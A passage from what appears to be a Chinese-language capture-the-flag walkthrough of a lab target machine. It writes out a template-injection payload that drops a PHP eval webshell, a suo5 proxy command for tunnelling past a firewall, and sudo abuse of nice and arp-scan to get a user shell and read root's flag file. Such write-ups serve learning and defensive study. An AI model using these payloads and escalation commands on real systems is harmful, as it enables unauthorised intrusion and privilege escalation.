这里就遇到一个问题了，弹不回来shell，想了一会可能是靶机开了防火墙，没办法，先写一个webshell上去

```
{{["echo '<?php eval(\$_POST[1]);' > shell.php"]|map("system")}}
```

既然存在防火墙，怎么获得一个shell呢，要么我能找到允许出入站的端口，要么我就代理进去，先前80端口也算提示了，用 suo5 这个http正向的代理工具

用webshell把suo5.php上传以后建立socks5代理

```bash
./suo5-linux-amd64 -t http://$IP/suo5.php
```

但其实我当时想说不定出站的80端口没关，所以直接弹80回来了

sudo -l 发现 nice 

```bash
sudo -u lanyangyang /bin/nice /bin/bash
```

![image-20260314153445081](/assets/img/posts/suo/image-20260314153445081.png)

sudo -l 发现 arp-scan，这种能工具的思路一般都比较一样，都是用读文件的方式把flag回显到

```bash
sudo /usr/bin/arp-scan --localnet --interface=eth0 --macfile=/root/root.txt
```
